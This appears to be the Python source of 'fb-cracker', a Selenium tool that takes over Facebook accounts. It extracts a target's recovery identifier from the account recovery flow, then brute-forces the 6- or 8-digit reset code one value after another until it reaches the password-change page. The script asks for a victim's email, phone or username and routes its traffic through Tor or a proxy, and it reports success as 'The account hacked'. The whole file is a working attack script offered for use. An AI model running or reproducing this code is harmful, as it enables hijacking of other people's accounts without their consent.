import selenium.webdriver as web_driver
import selenium.webdriver.support.ui as html_elem
import selenium.webdriver.support.expected_conditions as econ
import selenium.webdriver.common.by as b
import termcolor as pr
import time
import os


#import random
#tempval = ''.join(random.sample(val, 8))


# identify_email
def facebook_search(driver, email: str, phone: str):
    delay = 10
    counter = 0
    result = ""
    try:
        search = econ.presence_of_element_located((b.By.ID, "identify_email"))

        html_elem.WebDriverWait(driver, delay).until(search)

        fb_enrty = driver.find_element_by_id("identify_email")

        fb_enrty.clear()

        fb_enrty.send_keys(email)

        fb_search = econ.presence_of_element_located((b.By.ID, "did_submit"))

        html_elem.WebDriverWait(driver, delay).until(fb_search)

        login = driver.find_element_by_id("did_submit")

        web_driver.ActionChains(driver).click(login).perform()

        uid = econ.presence_of_element_located(
            (b.By.XPATH, '//*[@id="initiate_interstitial"]/div[3]/div/div[1]/a'))

        html_elem.WebDriverWait(driver, delay).until(uid)

        value = driver.find_element_by_xpath(
            '//*[@id="initiate_interstitial"]/div[3]/div/div[1]/a').get_attribute('href')

        result = value.replace("https://www.facebook.com/login/notme/?notme_cuid=",
                               "").replace("&flow=recovery&account_finder_source=account_recovery", "")

        if result != None and result != "":
            print(pr.colored("\tHash: ","green") + result)
            return str(result)
    except:
        counter += 1
        if counter == 2:
            print("\n\tFailed to get the hash.\n")
            return
        if phone != "":
            mobile = phone
            facebook_search(driver=driver, email=mobile, phone="")


def get_target_data(email: str, phone: str, username: str):
    if(email != ""):
        return email
    elif phone != "":
        return phone
    elif phone != "" and email != "" and username != "":
        return email
    elif email == "" and phone == "" and username != "":
        return username
    else:
        print("\n\tNo target set.\n")
        return "no"


def put_email(driver, email: str):
    wait = html_elem.WebDriverWait(driver, 20)
    em = wait.until(lambda driver: driver.find_element_by_id("email"))
    em.clear()
    em.send_keys(email)


def put_pass(driver):
    wait = html_elem.WebDriverWait(driver, 20)
    em = wait.until(lambda driver: driver.find_element_by_id("pass"))
    em.clear()
    em.send_keys("dsfsd564564/d")


def perform_click(driver):
    wait = html_elem.WebDriverWait(driver, 20)
    tconnecter = wait.until(lambda driver: driver.find_element_by_xpath(
        '/html/body/div[1]/div[2]/div[1]/div/div/div/div[2]/div/div[1]/form/div[2]/button'))
    web_driver.ActionChains(driver).click(tconnecter).perform()


def login_to_facebook(driver, email: str, phone: str):
    print("\n\tGo to facebook..")
    driver.get("https://www.facebook.com")
    # fb_accept_cookie(driver=driver)
    print("\n\tpass data..")
    
    put_email(driver=driver, email=email)

    put_pass(driver=driver)
    time.sleep(5)

    perform_click(driver=driver)
    result = ""
    
    print("\n\tExtracting hash..\n")
    time.sleep(5)
    driver.execute_script("window.open('');")
    time.sleep(5)
    driver.switch_to.window(driver.window_handles[2])
    driver.get("https://www.facebook.com/recover/initiate/?ars=facebook_login")
    try:
        if phone != "":
            wait = html_elem.WebDriverWait(driver, 20)
            uid = wait.until(lambda driver: driver.find_element_by_xpath(
            '/html/body/div[1]/div[2]/div[1]/div/div[2]/form/div/div[3]/div/div[1]/a').get_attribute('href'))
        
            result = uid.replace("https://www.facebook.com/login/notme/?notme_cuid=",
                             "").replace("&flow=recovery&account_finder_source=account_recovery", "")
        else:
            #fb_accept_cookie(driver=driver)
            wait = html_elem.WebDriverWait(driver, 20)
            uid = wait.until(lambda driver: driver.find_element_by_xpath(
                '//*[@id="initiate_interstitial"]/div[3]/div/div[1]/a').get_attribute('href'))

            result = uid.replace("https://www.facebook.com/login/notme/?notme_cuid=",
                                "").replace("&flow=recovery&account_finder_source=account_recovery", "")

        print(pr.colored("\tHash: ","green") + result)
    except:
        return facebook_search(driver=driver, email=email, phone=phone)

    if result != "" and result != None:
        return str(result)
    return None

# get the crypted user id
def get_hash(driver, email: str, phone: str, username: str):
    time.sleep(5)
    driver.execute_script("window.open('');")
    time.sleep(5)
    driver.switch_to.window(driver.window_handles[1])
    data = ""
    if(email != ""):
        data = login_to_facebook(driver=driver, email=email, phone=phone)
    elif phone != "" and email == "":
        data = login_to_facebook(driver=driver, email=phone, phone=phone)
    elif email == "" and phone == "" and username != "":
        data = login_to_facebook(driver=driver, email=username, phone=username)
    elif phone != "" and email != "" and username != "":
        data = login_to_facebook(driver=driver, email=phone, phone=phone)
    else:
        print("\n\tPlease provide the target email or phone / username.\n")
        return
    return data

def configure_chrome(proxy: str):
    # configure chrome
    browser_options = web_driver.ChromeOptions()
    if proxy != "no" and proxy != "":
        browser_options.add_argument('--proxy-server=%s' % proxy)
    browser_options.add_argument("--incognito")
    driver = web_driver.Chrome(
        executable_path="./drivers/chromedriver", options=browser_options)
    return driver


# get minimum code base on lenght (6 or 8)
def attack_type(lenght: int):
    lengh_switcher = {
        8: 10000000,
        6: 100000
    }
    return lengh_switcher.get(lenght, 100000)

# max number to try
def get_max_try(lenght: int):
    max_try_switch = {
        8: 99999999,
        6: 999999
    }
    return max_try_switch.get(lenght, 999999)

# send code
def facebook_send_code(driver, delay):
    send_code_btn = econ.presence_of_element_located(
        (b.By.XPATH, '//*[@id="initiate_interstitial"]/div[3]/div/div[1]/button'))
    html_elem.WebDriverWait(driver, delay).until(send_code_btn)
    send_code_go = driver.find_element_by_xpath(
        '//*[@id="initiate_interstitial"]/div[3]/div/div[1]/button')
    web_driver.ActionChains(driver).click(send_code_go).perform()

# crack facebook code.
def liniar_attack(browser: str, code_lenght: int, email: str = "", phone: str = "", username="", proxy: str = "no", attacktype="liniar"):
    print(pr.colored("\n\tfb-cracker v 1.0.1 By Mr_N", "green"))
    print(pr.colored("\n\tAttack type: ( " + attacktype + " )\n", "green"))
    
    # configure the browser
    driver = None
    if browser == "f":
        firefox_options = web_driver.FirefoxOptions()
        firefox_options.add_argument("--private")
        profile = web_driver.FirefoxProfile()
        profile.set_preference('network.proxy.type', 1)
        profile.set_preference('network.proxy.socks', '127.0.0.1')
        profile.set_preference('network.proxy.socks_port', 9150)
        driver = web_driver.Firefox(firefox_options=firefox_options,
                                    firefox_profile=profile, executable_path="./drivers/geckodriver")
    else:
        driver = configure_chrome(proxy)

    # make code lenght 8 or 6 (default: 6)
    current_code = attack_type(code_lenght)
    #current_code = 290381
    # get max number (default: 999999)
    max_number = get_max_try(code_lenght)

    target_account = get_target_data(
        email=email, phone=phone, username=username)

    # get hash
    cuid = get_hash(driver, email=email, phone=phone, username=username)

    if cuid == None or cuid == "":
        print("\n\tFailed to get the hash.\n")
        return
    
    # start the attack.
    baseurl = "https://www.facebook.com/recover/code/?n=" + \
        str(current_code)+"&s=23&exp_locale=fr_FR&cuid=" + \
        cuid+"&redirect_from=button"

    driver.execute_script("window.open('');")
    time.sleep(5)
    driver.switch_to.window(driver.window_handles[3])
    time.sleep(5)
    driver.get(baseurl)
    # Verify the target and start the attack
    if target_account != "no":
        print(pr.colored("\n\tStart facebook brute force attack against " +
              target_account + "...\n", "red"))
    else:
        return
    try:
        while current_code <= max_number:
            # Hacked, print curr val, pasword change url.
            currurl = driver.current_url
            if "https://www.facebook.com/recover/password/?" in str(currurl):
                print(pr.colored("\n\t*Congratulation! The account hacked with code:" + str(current_code-1), "red"))
                    
                print(pr.colored("\n\t*Password change link: " + str(currurl),"green"))
                print(pr.colored("\n\t*Donate : " + "mohamednmn28105@gmail.com\n", "green"))
                break

            # wait for code html input to appear and put the current code.
            codelwait = html_elem.WebDriverWait(driver, 20)
            codeentry = codelwait.until(
                lambda driver:  driver.find_element_by_id("recovery_code_entry"))
            codeentry.clear()
            codeentry.send_keys(current_code)

            # print the cuurent code
            print(pr.colored("\n\tCurrent code: " + str(current_code),"red"))

            # click continue to send the current code to facebook.
            btnwait = html_elem.WebDriverWait(driver, 20)
            connclick = btnwait.until(lambda driver: driver.find_element_by_xpath(
                "/html/body/div[1]/div[2]/div[1]/div/div[2]/form/div/div[3]/div/div[1]/button"))
            web_driver.ActionChains(driver).click(connclick).perform()
            # increse the current code by 1.
            current_code += 1

    except Exception as e:
        print('\n\t'+str(e))

    print(pr.colored ("\n\tEnd of attack. Cuurent code: " + str(current_code)+'.', "green"))


def clear():
    os.system("clear")

# user configuration
def start_facebook_killer(attack_type: str):
    clear()
    print("\n\tfb-cracker v 1 . 0 . 1 By Mr_N")
    print("\n\tAttack type: ( " + attack_type + " )")
    print("\n\tProvide all or one:" + pr.colored(" Email, Username, Phone ","red"))
    email = input("\n\tEnter the target email:")
    username = input("\n\tEnter the target username:")
    phone = input("\n\tEnter the target phone number:")
    browser = input(
        "\n\tChoose browser"+ pr.colored(" enter f for firefox ", "green") + "( chrome default ):")
    if browser == "f":
        print(pr.colored("\n Firefox: Leave Tor connected before continuing.","blue"))
    
    code_lengh = input("\n\tChoose the code lenght" + pr.colored(" 8 or 6 ","green") +"( default: 6 ) :")
    cl = int(code_lengh)
    user_proxy = input("\n\tEnter a proxy "+ pr.colored(" ip:port ","green") +"( default: disabled ) :")
    clear()
    liniar_attack(browser=browser, code_lenght=cl, email=email,
                  phone=phone, username=username, proxy=user_proxy)
